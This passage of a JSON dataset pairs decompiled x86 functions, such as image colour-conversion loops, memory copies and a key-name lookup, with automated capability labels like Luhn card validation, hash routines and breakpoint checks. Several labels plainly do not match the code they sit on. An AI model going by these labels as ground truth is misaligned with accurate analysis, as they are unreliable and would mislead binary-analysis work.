        "decompiled_code": "\nvoid __fastcall fcn.0042fa34(int32_t *param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iStack32;\n    uint8_t *puStack28;\n    uint8_t *puStack24;\n    int32_t iStack20;\n    \n    fcn.0042f8d4();\n    iStack20 = (**(*param_1 + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iStack32 = 0;\n        puStack28 = param_2;\n        do {\n            puVar1 = fcn.0042d324();\n            iVar2 = (**(*param_1 + 0x2c))();\n            iVar3 = (**(*param_1 + 0x20))();\n            iVar5 = iStack32;\n            if (iStack32 < 0) {\n                iVar5 = iStack32 + 3;\n            }\n            puVar6 = param_2 + iVar2 * (iVar3 + (iVar5 >> 2));\n            iVar5 = (**(*param_1 + 0x2c))();\n            iVar2 = (**(*param_1 + 0x20))();\n            iVar5 = iVar5 * iVar2;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + 3;\n            }\n            puStack24 = puVar6 + (iVar5 >> 2);\n            uVar4 = (**(*param_1 + 0x2c))();\n            iVar5 = uVar4 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar4 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar2 = *(in_EAX + 0x4c + *puStack28 * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    iVar2 = *(in_EAX + 0x4c + puStack28[1] * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    puVar1 = puVar1 + 6;\n                    puStack28 = puStack28 + 2;\n                    puVar6 = puVar6 + 1;\n                    puStack24 = puStack24 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iStack32 = iStack32 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 1083
    },
    "0042fc2c": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042fc2c(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *extraout_var;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iStack20;\n    \n    fcn.0042f8d4();\n    piVar6 = extraout_var;\n    iStack20 = (**(*extraout_var + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iVar7 = 0;\n        do {\n            puVar1 = fcn.0042d324(piVar6, iVar7);\n            uVar2 = (**(*piVar6 + 0x2c))();\n            iVar5 = uVar2 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar2 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar3 = *(in_EAX + 0x4c + *param_2 * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x4c + param_2[2] * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    puVar1 = puVar1 + 6;\n                    param_2 = param_2 + 4;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iVar7 = iVar7 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 897
    },
    "0043353c": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043353c(uint32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    var_14h = 0x3b9ac9f4 / (in_ECX << 7);\n    if (var_14h == 0) {\n        *(*in_EAX + 0x14) = 0x46;\n        (***in_EAX)();\n    }\n    if (arg_8h <= var_14h) {\n        var_14h = arg_8h;\n    }\n    *(iVar1 + 0x50) = var_14h;\n    iVar1 = fcn.00433298();\n    var_18h = 0;\n    if (arg_8h != 0) {\n        do {\n            if (arg_8h - var_18h <= var_14h) {\n                var_14h = arg_8h - var_18h;\n            }\n            iVar2 = fcn.004333c8();\n            piVar3 = iVar1 + var_18h * 4;\n            for (uVar4 = var_14h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *piVar3 = iVar2;\n                var_18h = var_18h + 1;\n                piVar3 = piVar3 + 1;\n                iVar2 = iVar2 + in_ECX * 0x80;\n            }\n        } while (var_18h < arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 437
    },
    "0043e52c": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e52c(int32_t param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    fcn.004318c0(param_2, in_EAX, param_1 << 7);\n    return;\n}\n",
        "token_count": 59
    },
    "004415fc": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nuint fcn.004415fc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint32_t uStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t *piStack40;\n    int32_t *piStack32;\n    int32_t aiStack28 [4];\n    \n    piVar8 = aiStack28;\n    iVar1 = *(in_EAX + 0x154);\n    piVar4 = in_EAX + 0xf4;\n    for (iStack56 = 0; iStack56 < *(in_EAX + 0xf0); iStack56 = iStack56 + 1) {\n        iVar7 = (**(*(in_EAX + 4) + 0x20))(0, *(*piVar4 + 0xc));\n        *piVar8 = iVar7;\n        piVar8 = piVar8 + 1;\n        piVar4 = piVar4 + 1;\n    }\n    iStack52 = *(iVar1 + 0x10);\n    do {\n        if (*(iVar1 + 0x14) <= iStack52) {\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n            fcn.00441088();\n            return 1;\n        }\n        for (uStack60 = *(iVar1 + 0xc); uStack60 < *(in_EAX + 0x104); uStack60 = uStack60 + 1) {\n            iVar7 = 0;\n            piStack32 = aiStack28;\n            piStack40 = in_EAX + 0xf4;\n            for (iStack56 = 0; iStack56 < *(in_EAX + 0xf0); iStack56 = iStack56 + 1) {\n                iVar2 = *piStack40;\n                iVar3 = *(iVar2 + 0x34);\n                for (iVar9 = 0; iVar9 < *(iVar2 + 0x38); iVar9 = iVar9 + 1) {\n                    iVar6 = *(*piStack32 + (iStack52 + iVar9) * 4) + iVar3 * uStack60 * 0x80;\n                    piVar4 = iVar1 + 0x18 + iVar7 * 4;\n                    for (iVar5 = 0; iVar5 < *(iVar2 + 0x34); iVar5 = iVar5 + 1) {\n                        *piVar4 = iVar6;\n                        iVar6 = iVar6 + 0x80;\n                        iVar7 = iVar7 + 1;\n                        piVar4 = piVar4 + 1;\n                    }\n                }\n                piStack32 = piStack32 + 1;\n                piStack40 = piStack40 + 1;\n            }\n            iVar7 = (**(*(in_EAX + 0x168) + 4))();\n            if (iVar7 == 0) {\n                *(iVar1 + 0x10) = iStack52;\n                *(iVar1 + 0xc) = uStack60;\n                return 0;\n            }\n        }\n        *(iVar1 + 0xc) = 0;\n        iStack52 = iStack52 + 1;\n    } while( true );\n}\n",
        "token_count": 763
    },
    "004429f4": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004429f4(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint8_t *puVar1;\n    int32_t in_ECX;\n    int32_t *piVar2;\n    int32_t in_EDX;\n    int32_t *piVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_11ch;\n    int32_t aiStack284 [63];\n    int16_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    code *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = *(*(in_EAX + 0x164) + 8);\n    var_ch = *(*(in_EAX + 0x164) + 0xc + *(in_EDX + 0x10) * 4);\n    var_4h = in_ECX + arg_10h * 4;\n    var_10h = 0;\n    if (arg_8h != 0) {\n        do {\n            piVar3 = &var_11ch;\n            iVar5 = 0;\n            piVar2 = var_4h;\n            do {\n                iVar6 = *piVar2;\n                piVar2 = piVar2 + 1;\n                puVar1 = iVar6 + arg_ch;\n                iVar5 = iVar5 + 1;\n                *piVar3 = *puVar1 - 0x80;\n                piVar3[1] = puVar1[1] - 0x80;\n                piVar3[2] = puVar1[2] - 0x80;\n                piVar3[3] = puVar1[3] - 0x80;\n                piVar3[4] = puVar1[4] - 0x80;\n                piVar3[5] = puVar1[5] - 0x80;\n                piVar3[6] = puVar1[6] - 0x80;\n                piVar3[7] = puVar1[7] - 0x80;\n                piVar3 = piVar3 + 8;\n            } while (iVar5 < 8);\n            (*var_8h)();\n            var_1ch = var_10h * 0x80 + arg_14h;\n            var_14h = 0;\n            var_18h = &var_11ch;\n            piVar3 = var_ch;\n            do {\n                iVar5 = *piVar3;\n                iVar6 = *var_18h;\n                if (iVar6 < 0) {\n                    iVar6 = (iVar5 >> 1) - iVar6;\n                    if (iVar6 < iVar5) {\n                        iVar4 = 0;\n                    }\n                    else {\n                        iVar4 = iVar6 / iVar5;\n                    }\n                    iVar4 = -iVar4;\n                }\n                else {\n                    iVar6 = iVar6 + (iVar5 >> 1);\n                    if (iVar6 < iVar5) {\n                        iVar4 = 0;\n                    }\n                    else {\n                        iVar4 = iVar6 / iVar5;\n                    }\n                }\n                piVar3 = piVar3 + 1;\n                *var_1ch = iVar4;\n                var_14h = var_14h + 1;\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + 1;\n            } while (var_14h < 0x40);\n            var_10h = var_10h + 1;\n            arg_ch = arg_ch + 8;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 867
    },
    "00442b48": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442b48(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    int32_t *piVar5;\n    int32_t in_EDX;\n    float *pfVar6;\n    int32_t iVar7;\n    float *pfVar8;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    float afStack280 [63];\n    int32_t var_18h;\n    float fStack24;\n    uint32_t var_10h;\n    float *var_ch;\n    code *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = *(*(in_EAX + 0x164) + 0x1c);\n    var_ch = *(*(in_EAX + 0x164) + 0x20 + *(in_EDX + 0x10) * 4);\n    var_4h = in_ECX + arg_10h * 4;\n    var_10h = 0;\n    if (arg_8h != 0) {\n        do {\n            pfVar6 = &var_118h;\n            iVar7 = 0;\n            piVar5 = var_4h;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n                puVar3 = iVar1 + arg_ch;\n                iVar7 = iVar7 + 1;\n                *pfVar6 = *puVar3 - 0x80;\n                pfVar6[1] = puVar3[1] - 0x80;\n                pfVar6[2] = puVar3[2] - 0x80;\n                pfVar6[3] = puVar3[3] - 0x80;\n                pfVar6[4] = puVar3[4] - 0x80;\n                pfVar6[5] = puVar3[5] - 0x80;\n                pfVar6[6] = puVar3[6] - 0x80;\n                pfVar6[7] = puVar3[7] - 0x80;\n                pfVar6 = pfVar6 + 8;\n            } while (iVar7 < 8);\n            (*var_8h)();\n            pfVar6 = &var_118h;\n            piVar4 = var_10h * 0x80 + arg_14h;\n            var_18h = 0;\n            pfVar8 = var_ch;\n            do {\n                fStack24 = *pfVar6 * *pfVar8;\n                iVar2 = fcn.00431914();\n                pfVar8 = pfVar8 + 1;\n                *piVar4 = iVar2 + -0x4000;\n                piVar4 = piVar4 + 1;\n                var_18h = var_18h + 1;\n                pfVar6 = pfVar6 + 1;\n            } while (var_18h < 0x40);\n            var_10h = var_10h + 1;\n            arg_ch = arg_ch + 8;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 807
    },
    "00453914": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00453914(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00433054": {
        "rules": [
            "check HTTP status code/09dd97b2e76544bcbbe79d95da398605"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00433054(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((in_EAX[5] != 200) && (in_EAX[5] != 0xc9)) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    iVar1 = fcn.004330c0();\n    if (iVar1 != 0) {\n        if (iVar1 == 1) {\n            iVar1 = 1;\n        }\n        else if (iVar1 == 2) {\n            if (param_2 != 0) {\n                *(*in_EAX + 0x14) = 0x33;\n                (***in_EAX)();\n            }\n            fcn.0043e54c();\n            iVar1 = 2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 237
    },
    "004346ec": {
        "rules": [
            "check for software breakpoints/d1dd5f93455f4658aa4c6550878cfb7e"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.004346ec(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uStack16;\n    \n    if (in_EAX[5] != 0xcd) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0x23] < in_EAX[0x1d]) {\n        iVar1 = in_EAX[2];\n        if (iVar1 != 0) {\n            *(iVar1 + 4) = in_EAX[0x23];\n            *(iVar1 + 8) = in_EAX[0x1d];\n            (**in_EAX[2])();\n        }\n        uStack16 = 0;\n        (**(in_EAX[0x6a] + 4))(param_1);\n        in_EAX[0x23] = in_EAX[0x23];\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x7b;\n        (**(*in_EAX + 4))();\n        uStack16 = param_1;\n    }\n    return uStack16 << 0x20;\n}\n",
        "token_count": 302
    },
    "00407010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407010(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 39
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401590(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 234
    },
    "0040247c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040247c(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004030ec();\n    return param_2 + param_1;\n}\n",
        "token_count": 47
    },
    "00402510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402510(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if (((999 < in_EDX) || (cVar1 = fcn.00402494(arg_8h),  cVar1 == '\\0')) ||\n       (cVar1 = fcn.00402494(arg_8h),  cVar1 == '\\0')) {\n        return 0;\n    }\n    if ((in_EAX == *(in_EAX + -0x4c)) &&\n       ((*(in_EAX + -0x24) == 0 ||\n        ((cVar1 = fcn.00402494(arg_8h),  cVar1 != '\\0' && (cVar1 = fcn.00402510(arg_8h),  cVar1 != '\\0')))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 208
    },
    "00402590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402590(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = *in_EAX;\n    cVar1 = fcn.00402510(&stack0xfffffffc);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 93
    },
    "00402df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402df4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x4a670c;\n    while (iVar1 != 0x4a6708) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x4a1044;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x4a6708 = 0x4a6708;\n    *0x4a670c = 0x4a6708;\n    iVar2 = 0x400;\n    iVar1 = 0x4a67a8;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4a87b0;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4a87ac) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4a87ac = 0x4a87ac;\n    *0x4a87b0 = 0x4a87ac;\n    return;\n}\n",
        "token_count": 388
    },
    "00403088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403088(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x0040309e:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x004030a9;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x0040309e;\n    param_1 = 0;\ncode_r0x004030a9:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "004030ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004030ec(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00403121;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00403121:\n    return;\n}\n",
        "token_count": 1536
    },
    "004033a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
